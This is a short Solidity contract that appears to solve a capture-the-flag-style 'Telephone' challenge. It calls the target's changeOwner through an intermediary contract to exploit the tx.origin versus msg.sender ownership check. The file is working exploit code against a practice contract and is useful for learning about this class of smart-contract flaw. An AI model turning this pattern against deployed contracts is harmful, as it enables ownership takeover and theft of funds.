// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Telephone.sol';

contract TelephoneAttacker {
    address public _attack_address;

    constructor(address attack_address_in) public {
        _attack_address = attack_address_in;
    }

    function attack() public {
        Telephone(_attack_address).changeOwner(msg.sender);
    }
}